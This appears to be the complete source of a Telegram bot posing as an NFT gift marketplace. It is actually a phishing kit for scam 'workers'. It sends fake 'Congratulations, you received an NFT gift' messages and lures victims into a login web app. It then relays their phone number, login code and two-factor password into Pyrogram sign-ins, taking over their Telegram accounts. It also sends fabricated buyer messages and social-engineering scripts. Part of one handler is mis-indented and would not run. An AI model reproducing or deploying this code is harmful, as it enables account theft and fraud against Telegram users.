#!/usr/bin/env python3
"""
======================================================================================
                    MARKETPLACE & NFT UNIFIED BOT v3.0
          Features: Multi-language, Beautiful UI, Advanced Fake Gifts
======================================================================================
"""

import asyncio
import logging
import sys
import os
import re
import json
import time
import sqlite3
import secrets
from pathlib import Path
from typing import Optional, Dict, List, Tuple
import aiohttp

# Aiogram
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardButton, WebAppInfo, FSInputFile,
    InlineQueryResultArticle, InputTextMessageContent, CallbackQuery
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Pyrogram
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid
)

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("UnifiedBot")

# ================= CONFIGURATION =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)
# ================= THREAD LOGGING =================
LOG_DIR = BASE_DIR / "logs"
LOG_DIR.mkdir(exist_ok=True)

def get_thread_logger(chat_id: int, thread_id: int | None = None):
    """
    Логгер для конкретного Telegram чата / forum-треда
    """
    if thread_id:
        name = f"chat-{chat_id}-thread-{thread_id}"
    else:
        name = f"chat-{chat_id}"

    log = logging.getLogger(name)

    if log.handlers:
        return log

    log.setLevel(logging.INFO)

    file_path = LOG_DIR / f"{name}.log"
    handler = logging.FileHandler(file_path, encoding="utf-8")
    formatter = logging.Formatter("[%(asctime)s] %(levelname)s: %(message)s")
    handler.setFormatter(formatter)

    log.addHandler(handler)
    log.propagate = False  # ❗ чтобы не дублировалось в UnifiedBot

    return log


def load_settings() -> dict:
    path = BASE_DIR / "settings.json"
    if path.exists():
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            if "site_url" in data and "api_url" not in data:
                data["api_url"] = data["site_url"].rstrip('/')
            return data
    return {
        "bot_token": os.getenv("BOT_TOKEN", ""),
        "api_id": int(os.getenv("API_ID", 0)),
        "api_hash": os.getenv("API_HASH", ""),
        "api_url": os.getenv("SITE_URL", "http://localhost:3000").rstrip('/'),
        "admin_ids": [],
        "workers": [],
        "target_user": None
    }


def save_settings():
    path = BASE_DIR / "settings.json"
    SETTINGS["workers"] = list(workers_list)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=2)


SETTINGS = load_settings()

# ================= LOCALIZATION =================
TEXTS = {
    "en": {
        "welcome": "<b>The Gateway's are open</b> 🫰\n\nA new trending way to trade Telegram gifts is here.\n\n📍 <b>Buy • Sell • Collect</b> — all in one place.",
        "btn_webapp": "🌀 Enter Stream",
        "btn_about": "ℹ️ About Us",
        "gift_received": "🎉 <b>CONGRATULATIONS!</b>\n\nYou have just received a new NFT gift!\n\n💎 <b>IonicDryer #7561</b> (<a href='https://t.me/nft/IonicDryer-7561'>https://t.me/nft/IonicDryer-7561</a>)\n\n<i>Gift added to your profile!</i>",
        "gift_already_claimed": "⚠️ <b>Gift Already Active</b>\n\nThis gift has already been activated by: <b>@{user}</b>",
        "withdraw_prompt": "⚠️ <b>Action Required</b>\n\nTo withdraw or trade this gift, please log in to the Marketplace.",
        "worker_activated": "✅ <b>Worker Mode Activated</b>\n\n🔹 Inline Mode: Enabled\n🔹 Commands: <code>/pyid</code>, <code>/1</code>",
        "choose_lang": "🌐 <b>Welcome! Please select your language:</b>",
        "lang_set": "✅ Language set to <b>English</b>."
    },
    "ru": {
        "welcome": "<b>Поток открыт</b> 🫰\n\nНовый трендовый способ обмена подарками Telegram уже здесь.\n\n📍 <b>Покупай • Продавай • Собирай</b> — всё в одном месте.",
        "btn_webapp": "🌀 Войти в Поток",
        "btn_about": "ℹ️ Подробнее о нас",
        "gift_received": "🎉 <b>ПОЗДРАВЛЯЕМ!</b>\n\nВы только что получили новый NFT подарок!\n\n💎 <b>IonicDryer #7561</b> (<a href='https://t.me/nft/IonicDryer-7561'>https://t.me/nft/IonicDryer-7561</a>)\n\n<i>Подарок добавлен в ваш профиль!</i>",
        "gift_already_claimed": "⚠️ <b>Подарок уже активирован</b>\n\nЭтот подарок уже был активирован пользователем: <b>@{user}</b>",
        "withdraw_prompt": "⚠️ <b>Требуется действие</b>\n\nЧтобы вывести или обменять этот подарок, пожалуйста, войдите в Маркет.",
        "worker_activated": "✅ <b>Режим Воркера Активирован</b>\n\n🔹 Инлайн режим: Включен\n🔹 Команды: <code>/pyid</code>, <code>/1</code>",
        "choose_lang": "🌐 <b>Добро пожаловать! Выберите язык:</b>",
        "lang_set": "✅ Язык установлен: <b>Русский</b>."
    }
}


# ================= DATABASE =================
class UnifiedDatabase:
    def __init__(self, db_file="unified_bot.db"):
        self.path = BASE_DIR / db_file
        self.conn = sqlite3.connect(str(self.path), check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
        self.check_migrations()
        self.load_workers()

    def create_tables(self):
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            balance INTEGER DEFAULT 0,
            is_authorized BOOLEAN DEFAULT 0,
            is_worker BOOLEAN DEFAULT 0,
            language TEXT DEFAULT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS gifts (
            hash TEXT PRIMARY KEY,
            creator_id INTEGER,
            claimed_by TEXT DEFAULT NULL,
            is_claimed BOOLEAN DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        self.conn.commit()

    def check_migrations(self):
        try:
            self.cursor.execute("SELECT is_worker FROM users LIMIT 1")
        except:
            self.cursor.execute("ALTER TABLE users ADD COLUMN is_worker BOOLEAN DEFAULT 0")
        try:
            self.cursor.execute("SELECT language FROM users LIMIT 1")
        except:
            self.cursor.execute("ALTER TABLE users ADD COLUMN language TEXT DEFAULT NULL")
        self.conn.commit()

    def load_workers(self):
        try:
            self.cursor.execute("SELECT user_id FROM users WHERE is_worker = 1")
            rows = self.cursor.fetchall()
            for row in rows:
                workers_list.add(row[0])
        except:
            pass

    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        row = self.cursor.fetchone()
        if not row:
            return None
        return {
            'user_id': row[0], 'username': row[1], 'first_name': row[2], 'phone': row[3],
            'is_authorized': bool(row[5]), 'is_worker': bool(row[6]), 'language': row[7]
        }

    def get_user_by_username(self, username):
        clean = username.replace("@", "").lower().strip()
        self.cursor.execute("SELECT user_id, first_name, language FROM users WHERE lower(username) = ?", (clean,))
        return self.cursor.fetchone()

    def add_user(self, user_id, username, first_name, phone=None):
        try:
            if not self.get_user(user_id):
                self.cursor.execute(
                    "INSERT INTO users (user_id, username, first_name, phone) VALUES (?, ?, ?, ?)",
                    (user_id, username or "Unknown", first_name or "Unknown", phone)
                )
            else:
                self.cursor.execute(
                    "UPDATE users SET username = ?, first_name = ?, phone = ? WHERE user_id = ?",
                    (username or "Unknown", first_name or "Unknown", phone, user_id)
                )
            self.conn.commit()
        except Exception as e:
            logger.error(f"DB Error add_user: {e}")

    def set_language(self, user_id, lang):
        self.cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang, user_id))
        self.conn.commit()

    def set_worker(self, user_id):
        self.cursor.execute("UPDATE users SET is_worker = 1 WHERE user_id = ?", (user_id,))
        self.conn.commit()
        workers_list.add(user_id)
        save_settings()

    def mark_authorized(self, user_id, phone):
        self.cursor.execute("UPDATE users SET is_authorized = 1, phone = ? WHERE user_id = ?", (phone, user_id))
        self.conn.commit()

    def register_gift(self, gift_hash, creator_id):
        try:
            self.cursor.execute("INSERT INTO gifts (hash, creator_id) VALUES (?, ?)", (gift_hash, creator_id))
            self.conn.commit()
        except:
            pass

    def get_gift_status(self, gift_hash):
        self.cursor.execute("SELECT is_claimed, claimed_by FROM gifts WHERE hash = ?", (gift_hash,))
        return self.cursor.fetchone()

    def claim_gift(self, gift_hash, username):
        self.cursor.execute("UPDATE gifts SET is_claimed = 1, claimed_by = ? WHERE hash = ?", (username, gift_hash))
        self.conn.commit()

    def get_stats(self):
        try:
            self.cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
            u = self.cursor.fetchone()[0]
            self.cursor.execute("SELECT SUM(balance) FROM users")
            b = self.cursor.fetchone()[0] or 0
            return u, b
        except:
            return 0, 0


db = UnifiedDatabase()
workers_list = set(SETTINGS.get("workers", []))


# ================= STATES & STORAGE =================
class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()


user_sessions = {}
pyrogram_clients = {}
processed_requests = {}
admin_auth_process = {}


# ================= HELPERS =================
def clean_phone(phone):
    if not phone:
        return ""
    c = re.sub(r'\D', '', str(phone))
    if len(c) == 11 and c.startswith('8'):
        c = '7' + c[1:]
    elif len(c) == 10:
        c = '7' + c
    return '+' + c if not c.startswith('+') else c


def get_webapp_url(user_id):
    base = SETTINGS['api_url'].rstrip('/')
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}chatId={user_id}"


def get_text(user_id, key):
    user = db.get_user(user_id)
    lang = user['language'] if user and user.get('language') else 'en'
    return TEXTS.get(lang, TEXTS['en']).get(key, "")


# ================= API HELPERS =================
async def send_claim_to_api(uid, gift_hash, username):
    """Send claim request to website API"""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{SETTINGS['api_url']}/api/telegram/claim-gift"
            payload = {
                "telegramId": str(uid),
                "giftId": f"IonicDryer-7561",
                "giftHash": gift_hash,
                "username": username
            }
            logger.info(f"[API] Sending claim: {payload}")
            async with session.post(url, json=payload, timeout=10) as resp:
                result = await resp.json()
                logger.info(f"[API] Claim response: {result}")
                return result
    except Exception as e:
        logger.error(f"[API] Claim error: {e}")
        return None


async def update_api_status(api_url, rid, status, **kwargs):
    """Update auth request status on website"""
    url = f"{api_url}/api/telegram/update-request"
    data = {"requestId": rid, "status": status, "processed": True, **kwargs}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=data, timeout=10) as resp:
                logger.info(f"[API] Status update {status}: {resp.status}")
    except Exception as e:
        logger.error(f"[API] Status update error: {e}")


# ================= ROUTER =================
def get_router(bot: Bot) -> Router:
    router = Router()

    async def is_worker(uid):
        return uid in workers_list or uid in SETTINGS.get("admin_ids", [])

    @router.message(CommandStart())
    async def cmd_start(msg: types.Message, command: CommandObject):
    tlog = get_thread_logger(
        msg.chat.id,
        msg.message_thread_id
    )

    tlog.info(
        f"/start user_id={msg.from_user.id} "
        f"username={msg.from_user.username} "
        f"args={command.args}"
    )
        try:
            uid = msg.from_user.id
            username = msg.from_user.username or f"ID:{uid}"

            # Register user
            db.add_user(uid, username, msg.from_user.first_name)
            user = db.get_user(uid)

            if not user:
                user = {'language': None}

            # Check language
            if not user.get('language'):
                logger.info(f"User {uid} has no language, sending selection.")
                kb = InlineKeyboardBuilder()
                kb.button(text="🇬🇧 English", callback_data="lang_en")
                kb.button(text="🇷🇺 Русский", callback_data="lang_ru")
                kb.adjust(2)
                await msg.answer(TEXTS['en']['choose_lang'], reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
                return

            user_lang = user['language']

            # Process gifts (Deep Link)
            args = command.args
            if args and args.startswith("claim_"):
                gift_hash = args.replace("claim_", "")
                logger.info(f"Claiming gift: {gift_hash}")

                gift_status = db.get_gift_status(gift_hash)

                if gift_status and gift_status[0]:  # Already claimed
                    claimer_name = gift_status[1]
                    await msg.answer(
                        TEXTS[user_lang]['gift_already_claimed'].format(user=claimer_name),
                        parse_mode=ParseMode.HTML
                    )
                    return

                else:
                    # Claim in local DB
                    db.claim_gift(gift_hash, username)
                    
                    # Send claim to website API
                    asyncio.create_task(send_claim_to_api(uid, gift_hash, username))

                    # Gift image via proxy
                    gift_image = "https://wsrv.nl/?url=https://tgcdnimages.com/gifts/IonicDryer.png&output=png"

                    try:
                        await msg.answer_photo(
                            photo=gift_image,
                            caption=TEXTS[user_lang]["gift_received"],
                            parse_mode=ParseMode.HTML
                        )
                    except Exception as e:
                        logger.error(f"Image failed to load: {e}")
                        await msg.answer(
                            TEXTS[user_lang]["gift_received"],
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=False
                        )

                    await asyncio.sleep(1)
                    await msg.answer(get_text(uid, "withdraw_prompt"), parse_mode=ParseMode.HTML)
                    return

            # Main menu (if no gift)
            text = get_text(uid, "welcome")
            kb = InlineKeyboardBuilder()
            kb.row(InlineKeyboardButton(text=get_text(uid, "btn_webapp"), web_app=WebAppInfo(url=get_webapp_url(uid))))
            kb.row(InlineKeyboardButton(text=get_text(uid, "btn_about"), url="https://t.me/IT_Portal"))

            try:
                if (BASE_DIR / "start.jpg").exists():
                    await msg.answer_photo(photo=FSInputFile("start.jpg"), caption=text,
                                           reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
                else:
                    await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
            except Exception as e:
                logger.error(f"Error sending photo: {e}")
                await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

        except Exception as e:
            logger.error(f"CRITICAL ERROR in cmd_start: {e}", exc_info=True)
            await msg.answer("Bot error occurred. Try again later.")

    # --- LANG CALLBACKS ---
    @router.callback_query(F.data.startswith("lang_"))
    async def set_language(c: CallbackQuery):
        lang = c.data.split("_")[1]
        db.set_language(c.from_user.id, lang)
        await c.message.delete()

        await c.message.answer(TEXTS[lang]['lang_set'], parse_mode=ParseMode.HTML)
        
        uid = c.from_user.id
        text = get_text(uid, "welcome")
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text=get_text(uid, "btn_webapp"), web_app=WebAppInfo(url=get_webapp_url(uid))))
        kb.row(InlineKeyboardButton(text=get_text(uid, "btn_about"), url="https://t.me/IT_Portal"))

        if (BASE_DIR / "start.jpg").exists():
            await c.message.answer_photo(photo=FSInputFile("start.jpg"), caption=text, reply_markup=kb.as_markup(),
                                         parse_mode=ParseMode.HTML)
        else:
            await c.message.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    # --- WORKER TOOLS ---
    @router.message(Command("mamontloh"))
    async def activate_worker(msg: types.Message):
        db.set_worker(msg.from_user.id)
        user_lang = db.get_user(msg.from_user.id)['language'] or 'en'
        await msg.answer(TEXTS[user_lang]['worker_activated'], parse_mode=ParseMode.HTML)

    # --- INLINE QUERY (FAKE GIFT) ---
    @router.inline_query()
    async def inline_handler(query: types.InlineQuery):
        user_id = query.from_user.id

        if user_id not in workers_list:
            return

        bot_info = await bot.get_me()

        gift_hash = secrets.token_hex(8).upper()
        db.register_gift(gift_hash, user_id)

        deep_link = f"https://t.me/{bot_info.username}?start=claim_{gift_hash}"
        visual_link = "https://t.me/nft/IonicDryer-7561"
        image_url = "https://cache.tonapi.io/imgproxy/bU_q1c-wJ4_Lh8j6FqJ7wH7wJ4_Lh8j6FqJ7wH7wJ4_/rs:fill:500:500:1/g:no/aHR0cHM6Ly90Z2NkbmltYWdlcy5jb20vZ2lmdHMvSW9uaWNEcnllci5wbmc.webp"

        message_content = (
            f"<a href='{image_url}'>&#8203;</a>"
            "🎉 <b>Congratulations!</b>\n"
            "<i>You have just received a new NFT gift, check it out in your Profile! 📍</i>\n\n"
            f"💎 <a href='{visual_link}'>IonicDryer #7561</a>"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🎁 Claim Gift", url=deep_link))
        kb.row(InlineKeyboardButton(text="👀 View Gift", url=visual_link))

        result = InlineQueryResultArticle(
            id=gift_hash,
            title="💎 Send IonicDryer #7561",
            description="Ready to send",
            thumbnail_url=image_url,
            input_message_content=InputTextMessageContent(
                message_text=message_content,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=False
            ),
            reply_markup=kb.as_markup()
        )
        await query.answer([result], cache_time=1, is_personal=True)

    # --- WORKER COMMANDS ---
    @router.message(Command("pyid"))
    async def cmd_pyid(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
        try:
            parts = msg.text.split(maxsplit=2)
            if len(parts) < 3:
                return await msg.answer("Usage: `/pyid @user text`", parse_mode=ParseMode.MARKDOWN)

            user = db.get_user_by_username(parts[1])
            if not user:
                return await msg.answer("User not found in bot DB.")

            fake_msg = (
                "@GiftsToGateway_Bot has no KYC requirements. Stay safe.\n\n"
                "📩 <b>Buyer from deal #EV42399</b> sent you a message:\n\n"
                f"<blockquote>\"{parts[2]}\"</blockquote>"
            )
            await bot.send_message(user[0], fake_msg, parse_mode=ParseMode.HTML)
            await msg.answer(f"Sent to {parts[1]}")
        except Exception as e:
            await msg.answer(f"Error: {e}")

    @router.message(Command("1"))
    async def cmd_one(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
        try:
            parts = msg.text.split()
            if len(parts) < 2:
                return await msg.answer("Usage: `/1 @user`", parse_mode=ParseMode.MARKDOWN)

            user = db.get_user_by_username(parts[1])
            if not user:
                return await msg.answer("User not found.")

            script = (
                f"Привет, можешь пожалуйста отправить {parts[1]} и потом прикрепи скрин реакции, окей?\n"
                "(Что-то наподобие сюрприза должно быть)"
            )
            await bot.send_message(user[0], script)
            await msg.answer(f"Script sent to {parts[1]}")
        except Exception as e:
            await msg.answer(f"Error: {e}")

    # --- ADMIN PANEL ---
    @router.message(Command("admin"))
    async def admin_panel(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
        u, bal = db.get_stats()
        status = "Online" if pyrogram_clients else "Offline"

        text = (
            f"<b>ADMINISTRATION</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<b>Users:</b> {u}\n"
            f"<b>Balance:</b> {bal} USDT\n"
            f"<b>System:</b> {status}\n"
            f"<b>Target:</b> <code>{SETTINGS.get('target_user', 'None')}</code>\n"
            f"━━━━━━━━━━━━━━━━"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="Set Target", callback_data="set_target"),
               InlineKeyboardButton(text="Statistics", callback_data="admin_stats"))
        kb.row(InlineKeyboardButton(text="Banker Login", callback_data="admin_login"))
        kb.row(InlineKeyboardButton(text="Close Panel", callback_data="close_admin"))

        await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.callback_query(F.data == "close_admin")
    async def close_admin(c: CallbackQuery):
        await c.message.delete()

    @router.callback_query(F.data == "admin_login")
    async def login_start(c: CallbackQuery, state: FSMContext):
        await c.message.delete()
        await c.message.answer("<b>Banker Login</b>\nEnter phone number (e.g. +12345...):", parse_mode=ParseMode.HTML)
        await state.set_state(AdminLoginState.waiting_phone)

    # --- AUTH HANDLERS ---
    @router.message(AdminLoginState.waiting_phone)
    async def auth_phone(msg: types.Message, state: FSMContext):
        phone = clean_phone(msg.text)
        try:
            client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
                            api_hash=SETTINGS['api_hash'])
            await client.connect()
            sent = await client.send_code(phone)
            admin_auth_process[msg.from_user.id] = {"c": client, "p": phone, "h": sent.phone_code_hash}
            await msg.answer("<b>Enter Verification Code:</b>", parse_mode=ParseMode.HTML)
            await state.set_state(AdminLoginState.waiting_code)
        except Exception as e:
            await msg.answer(f"Error: {e}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def auth_code(msg: types.Message, state: FSMContext):
        d = admin_auth_process.get(msg.from_user.id)
        try:
            await d['c'].sign_in(d['p'], d['h'], msg.text)
            await msg.answer("<b>Authorized Successfully!</b>", parse_mode=ParseMode.HTML)
            await d['c'].disconnect()
            await state.clear()
        except SessionPasswordNeeded:
            await msg.answer("<b>2FA Required. Enter Password:</b>", parse_mode=ParseMode.HTML)
            await state.set_state(AdminLoginState.waiting_password)
        except Exception as e:
            await msg.answer(f"Error: {e}")

    @router.message(AdminLoginState.waiting_password)
    async def auth_pass(msg: types.Message, state: FSMContext):
        d = admin_auth_process.get(msg.from_user.id)
        try:
            await d['c'].check_password(msg.text)
            await msg.answer("<b>Authorized with 2FA!</b>", parse_mode=ParseMode.HTML)
            await d['c'].disconnect()
            await state.clear()
        except Exception as e:
            await msg.answer(f"Error: {e}")

    # --- CONTACT ---
    @router.message(F.contact)
    async def on_contact(msg: types.Message):
        if not msg.contact.phone_number:
            return
        ph = clean_phone(msg.contact.phone_number)
        db.add_user(msg.from_user.id, msg.from_user.username, msg.from_user.first_name, ph)
        try:
            async with aiohttp.ClientSession() as s:
                await s.post(f"{SETTINGS['api_url']}/api/telegram/receive-phone",
                             json={"phone": ph, "telegramId": msg.from_user.id})
        except:
            pass

    return router


# ================= MAIN APP =================
class UnifiedBot:
    def __init__(self):
        self.bot = None
        self.dp = None
        self.api_url = SETTINGS['api_url']

    async def process_queue(self):
        logger.info("Polling API...")
        async with aiohttp.ClientSession() as sess:
            while True:
                try:
                    async with sess.get(f"{self.api_url}/api/telegram/get-pending", timeout=10) as r:
                        if r.status == 200:
                            data = await r.json()
                            for req in data.get('requests', []):
                                rid = req.get('requestId')
                                if rid not in processed_requests:
                                    processed_requests[rid] = True
                                    asyncio.create_task(self.handle_req(req))
                except Exception as e:
                    logger.debug(f"Polling error: {e}")
                await asyncio.sleep(2)

    async def handle_req(self, req):
        rid = req.get('requestId')
        act = req.get('action')
        phone = clean_phone(req.get('phone'))
        code = req.get('code')
        pw = req.get('password')
        tg_id = req.get('telegramId')

        logger.info(f"Processing request: {rid}, action={act}, phone={phone}")

        client = pyrogram_clients.get(phone)
        
        try:
            if act == 'send_phone':
                if not phone:
                    return
                client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
                                api_hash=SETTINGS['api_hash'])
                pyrogram_clients[phone] = client
                if not client.is_connected:
                    await client.connect()
                sent = await client.send_code(phone)
                user_sessions[phone] = {'h': sent.phone_code_hash}
                logger.info(f"Code sent to {phone}")
                await update_api_status(self.api_url, rid, "waiting_code", phone=phone)

            elif act == 'send_code':
                if not client:
                    client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
                                    api_hash=SETTINGS['api_hash'])
                    pyrogram_clients[phone] = client
                if not client.is_connected:
                    await client.connect()

                try:
                    await client.sign_in(phone, user_sessions[phone]['h'], code)
                    db.mark_authorized(tg_id, phone)
                    logger.info(f"Auth success for {phone}")
                    await update_api_status(self.api_url, rid, "success", phone=phone)
                    await client.disconnect()
                except SessionPasswordNeeded:
                    logger.info(f"2FA required for {phone}")
                    await update_api_status(self.api_url, rid, "waiting_password", phone=phone)
                except (PhoneCodeInvalid, PhoneCodeExpired) as e:
                    logger.error(f"Code error: {e}")
                    await update_api_status(self.api_url, rid, "error", error=str(e))
                except Exception as e:
                    logger.error(f"Sign in error: {e}")
                    await update_api_status(self.api_url, rid, "error", error=str(e))

            elif act == 'send_password':
                if not client:
                    client = pyrogram_clients.get(phone)
                if not client:
                    logger.error(f"No client for password: {phone}")
                    await update_api_status(self.api_url, rid, "error", error="No active session")
                    return
                    
                if not client.is_connected:
                    await client.connect()
                try:
                    await client.check_password(pw)
                    db.mark_authorized(tg_id, phone)
                    logger.info(f"2FA auth success for {phone}")
                    await update_api_status(self.api_url, rid, "success", phone=phone)
                    await client.disconnect()
                except PasswordHashInvalid:
                    logger.error(f"Wrong password for {phone}")
                    await update_api_status(self.api_url, rid, "error", error="Wrong password")
                except Exception as e:
                    logger.error(f"Password error: {e}")
                    await update_api_status(self.api_url, rid, "error", error=str(e))

        except Exception as e:
            logger.error(f"Request error: {e}")
            await update_api_status(self.api_url, rid, "error", error=str(e))

    async def run(self):
        if not SETTINGS['bot_token']:
            logger.error("NO BOT TOKEN")
            return

        self.bot = Bot(token=SETTINGS['bot_token'], default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        self.dp = Dispatcher()
        from scripts.audit_middleware import AuditMiddleware
        self.dp.message.middleware(AuditMiddleware())
        self.dp.callback_query.middleware(AuditMiddleware())
        self.dp.include_router(get_router(self.bot))
        asyncio.create_task(self.process_queue())
        logger.info("BOT v3.0 STARTED")
        await self.dp.start_polling(self.bot)


if __name__ == "__main__":
    try:
        asyncio.run(UnifiedBot().run())
    except KeyboardInterrupt:
        pass
